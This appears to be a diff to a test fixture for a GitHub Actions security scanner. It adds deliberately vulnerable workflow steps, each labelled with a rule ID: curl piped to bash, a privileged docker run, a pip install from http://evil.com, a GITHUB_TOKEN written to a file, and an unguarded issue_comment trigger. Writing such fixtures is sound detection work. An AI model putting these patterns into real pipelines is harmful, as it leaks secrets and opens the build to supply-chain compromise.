@@ -9,6 +9,9 @@ on:
   push:
     tags:
       - 'v*'
+  # GHA-013: issue_comment trigger without author_association guard.
+  issue_comment:
+    types: [created]
   # GHA-009: workflow_run trigger that ingests an upstream artifact
   # without verifying its signature.
   workflow_run:
@@ -57,6 +60,13 @@ jobs:
           DEBUG_AWS_KEY: AKIAIOSFODNN7EXAMPLE
         run: npm run deploy
 
+  # GHA-014: deploy-named job without environment: binding.
+  deploy:
+    runs-on: ubuntu-latest
+    needs: build
+    steps:
+      - run: echo "deploying to prod"
+
   ingest-upstream:
     # GHA-009: downloads an artifact from the workflow_run trigger
     # WITHOUT cosign verify / `gh attestation verify` / sha256sum -c.
@@ -68,3 +78,16 @@ jobs:
           name: build-output
           run-id: ${{ github.event.workflow_run.id }}
       - run: ./build-output/install.sh
+
+  # GHA-016: curl piped to bash.
+  # GHA-017: docker run --privileged.
+  # GHA-018: pip install from insecure source.
+  # GHA-019: GITHUB_TOKEN written to file.
+  # GHA-020: no vuln scanning step.
+  insecure-build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl https://example.com/install.sh | bash
+      - run: docker run --privileged myimage
+      - run: pip install --index-url http://evil.com/simple/ pkg
+      - run: echo $GITHUB_TOKEN > token.txt
